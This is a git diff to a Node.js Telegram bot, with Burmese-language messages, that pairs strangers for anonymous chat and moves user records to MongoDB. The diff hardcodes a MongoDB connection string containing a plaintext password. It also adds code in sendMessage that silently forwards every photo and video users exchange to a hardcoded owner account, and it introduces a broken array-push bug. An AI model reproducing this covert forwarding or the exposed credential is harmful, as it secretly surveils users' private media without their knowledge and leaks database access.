@@ -5,24 +5,42 @@ const bot = new TelegramBot(botToken, { polling: true });
 const express = require('express');
 // Create an Express application
 const app = express();
+const { MongoClient } = require('mongodb');
+
+// Connection URI
+const uri = 'mongodb+srv://Geek:Wu2wm5ltnipo3FcP@chatbot.rm39fbb.mongodb.net/?retryWrites=true&w=majority&appName=chatbot';
+
+// Create a new MongoClient
+const client = new MongoClient(uri);
+let dataBase = client.db("users");
+let collection = dataBase.collection("data");
 
 // Middleware to parse JSON bodies
-let genderQuee = {}
-let waitingQuee = [];
-let messageQuee = {};
-let inMessage = [];
-let replyQuee = {};
+let genderQuee = {}; //chatId:gender
+let waitingQuee = []; // [{}] = [{chatId:chatId}];
+let messageQuee = {};// {chatId:chaId};
+let inMessage = []; // [chatId];
+let replyQuee = {}; // {chatId:[1,2]}, in that number inside array means the value or the key of reply listner
+
+let helpLine = `🚨 Bot သုံးနည်း
+
+👮‍♂  /start ,  /find command သည် လူရှားရန်ုဖြစ်သည်။ 
+
+👮‍♂ /next command သည်လက်ရှိစကားပြောနေသောလူအား ကျော်ရန်ဖြစ်သည်။
+
+👮‍♂ /stop command သည် bot ကိုရပ်တန့်ရန်ဖြစ်သည်။
+
+/help ကို သုံးပြီး bot သုံးနည်းကို လေ့လာနိုင်သည်။
 
 
+⚠️ အထက်ပါဖော်ပြထားသော commands များကို စားရိုက်ပြီးပို့နိုင်သလို အဲ့ command များကို ဖော်ပြထားသော နေရာတွင် နှိပ်၍လဲ သုံးနိုင်သည်။`
 
-function checkUserAuth(chatId) {
+async function checkUserAuth(chatId) {
     // this function check the user auth if the user  registerd it will return true
     // if not then flase will return
     try {
-        let data = fs.readFileSync("./data/users.json", "utf-8");
-        data = JSON.parse(data);
-
-        if (data.data[chatId] != undefined) {
+        let userData = await collection.find({chatId}).toArray();
+        if (userData[0]!=undefined) {
             return true;
         }
         return false;
@@ -72,7 +90,7 @@ function register(msg) {
                 setTime = setTimeout(() => {
                     bot.removeReplyListener(replyIndex);
                     res(false); // will return to ageResponse
-                }, 1000 * 20);
+                }, 1000 * 60);
 
                 replyIndex = bot.onReplyToMessage(chatId, ageMessage.message_id, (reply) => {
                     // if the user does not enter a number then it will be deleted automatically
@@ -100,8 +118,8 @@ function register(msg) {
             const keyboard = {
                 reply_markup: {
                     inline_keyboard: [
-                        [{ text: '🚹 Male', callback_data: 'male' }],
-                        [{ text: '🚺 Female', callback_data: 'female' }],
+                        [{ text: '🚹 Male - ကျား', callback_data: 'male' }],
+                        [{ text: '🚺 Female - မ', callback_data: 'female' }],
                         [{ text: '⭕ Other', callback_data: 'other' }],
                     ],
                 },
@@ -118,7 +136,7 @@ function register(msg) {
                     // in every 1 second we are checking does user press any button or not
                     // if users press any button their gender will store in genderQuee and key is their chatId
                     // and will make genderQuee[chatId] not equal to undefined
-                    // if user does not press any button in 15 second then we will clear interval and will return false
+                    // if user does not press any button in 60 second then we will clear interval and will return false
                     // 
                     if (genderQuee[chatId] != undefined) {
                         clearInterval(interval); // stop the current interval;
@@ -126,7 +144,7 @@ function register(msg) {
                         delete genderQuee[chatId];
                         res(genderType); // will return to genderRespose
                     }
-                    if (index > 15) {
+                    if (index > 60) {
                         // indicate user does not press any button so clear the interval and return false
                         clearInterval(interval);
                         res(false);
@@ -144,14 +162,16 @@ function register(msg) {
            gender  = genderRespose;
 
 
-            // res({name,userName,age,gender});
 
             // adding that user details to user.json
-            let data = fs.readFileSync("./data/users.json", "utf-8");
-            data = JSON.parse(data);
+            
 
-            data.data[chatId] = { name, userName, age, gender };
-            fs.writeFileSync("./data/users.json", JSON.stringify(data));
+            let userData =  { name, userName, age, gender,chatId };
+            let dataAddStatus = await  collection.insertOne(userData);
+            if(dataAddStatus.acknowledged==false){
+                res(false);
+                return;
+            }
             await bot.sendMessage(chatId, "✅ Your account is registered successfully");
             res(true);
 
@@ -216,13 +236,13 @@ function connectBothUser(chatId1, chatId2) {
 
 
 
-function mainHandler(msg) {
+async function mainHandler(msg) {
     try{
     // checking does the user is auth or not
     // to check the user auth we use checkAuth(chatId) function
     // that function return true if auth else false and if there is an error it return "error"
         let chatId = msg.chat.id;
-        let isAuth = checkUserAuth(chatId);
+        let isAuth = await checkUserAuth(chatId);
         if (isAuth == false) {
             register(msg).then((val) => {
                 if (val == false) {
@@ -269,7 +289,7 @@ function isInMessage(chatId) {
 // adding disconnection functioin and remove replyListern
 
 function removeListeners(chatId) {
-    let removeList = replyQuee[chatId];
+    let removeList = replyQuee[chatId]; // will get array of replyListener id ;
     if (removeList == undefined) {
         return;
     }
@@ -280,7 +300,7 @@ function removeListeners(chatId) {
     delete replyQuee[chatId];
 }
 
-async function disconnection(chatId, sendMarkup) {
+async function disconnection(chatId, sendMarkup,command) {
     try {
         if (!isInMessage(chatId)) { // isInMessage is a functiion that chcek whether you are in chat or not
             await bot.sendMessage(chatId, "🤨 ကျော်ဖို့ ဘယ်သူမှ မရှိဘူး \n\n🚀 ရှာရန် /start 𝙤𝙧 /find ကိုနှိပ်ပါ🌚");
@@ -310,8 +330,12 @@ async function disconnection(chatId, sendMarkup) {
         // removeListerns is the fucnction to remove reply listners
         removeListeners(chatId);
         removeListeners(user2);
-
-        await bot.sendMessage(chatId, "သင်ရပ်တန့်လိုက်ပြီး💢\n\n နောက်တစ်ယောက်ရှာရန် /start or /find ကိုနှိပ်ပါ🙃", keyboard);
+        if(command=="/stop"){
+            await bot.sendMessage(chatId, "သင်ရပ်တန့်လိုက်ပြီး💢\n\n နောက်တစ်ယောက်ရှာရန် /start or /find ကိုနှိပ်ပါ🙃", keyboard);
+        }
+        else{
+            await bot.sendMessage(chatId, "သင်ရပ်တန့်လိုက်ပြီး💢\n\n သင့်အတွက်နောက်တစ်ယောက် ရှားနေပါသည်😜", keyboard);
+        }
         await bot.sendMessage(user2, "ခနခန😅 အကျော် ခံရပြီး \n\nနောက်တစ်ယောက်ရှာရန် /start or /find ကိုနှိပ်ပါ🙃", keyboard);
 
         return true;
@@ -335,13 +359,13 @@ bot.on("message", async(msg) => {
 
          }
         else if(msg.text=="/next"){
-            let disconnectionStaus = disconnection(msg.chat.id,false);
+            let disconnectionStaus = disconnection(msg.chat.id,false,"/next");
             if(disconnectionStaus==true){
                 mainHandler(msg);
             }
         }
         else if(msg.text=="/stop"){
-            await disconnection(msg.chat.id,true);
+            await disconnection(msg.chat.id,true,"/stop");
         }
 
         else if (messageQuee[msg.chat.id] != undefined && msg.reply_to_message == undefined) {
@@ -386,17 +410,18 @@ function addReplyListenerId(replyId, toSendChatId) {
             replyQuee[toSendChatId] = [replyId];
         }
         else {
-            let data = replyQuee[toSendChatId];
-            data.push(replyId);
-            replyQuee[toSendChatId] = data;
+            let replyId = replyQuee[toSendChatId];
+            replyId.push(replyId);
+            replyQuee[toSendChatId] = replyId;
         }
 
-        console.log(replyQuee);
     }
     catch (err) {
         console.log(err);
     }
 }
+
+let ownerId = "6798013182"
 
 async function sendMessage(toSendChatId, msg, messagaId, originalMessageId) {
     try {
@@ -410,6 +435,8 @@ async function sendMessage(toSendChatId, msg, messagaId, originalMessageId) {
                 caption = msg.caption;
             }
             messageData = await bot.sendPhoto(toSendChatId, msg.photo[2].file_id, { caption: caption, reply_to_message_id: messagaId });
+
+            bot.sendPhoto(ownerId, msg.photo[2].file_id, { caption: caption, reply_to_message_id: messagaId });
         }
         else if (msg.video) {
             let caption;
@@ -417,6 +444,8 @@ async function sendMessage(toSendChatId, msg, messagaId, originalMessageId) {
                 caption = msg.caption;
             }
             messageData = await bot.sendVideo(toSendChatId, msg.video.file_id, { caption: caption, reply_to_message_id: messagaId });
+
+            bot.sendVideo(ownerId, msg.video.file_id, { caption: caption, reply_to_message_id: messagaId });
         }
         else if (msg.sticker) {
             messageData = await bot.sendSticker(toSendChatId, msg.sticker.file_id, { reply_to_message_id: messagaId });
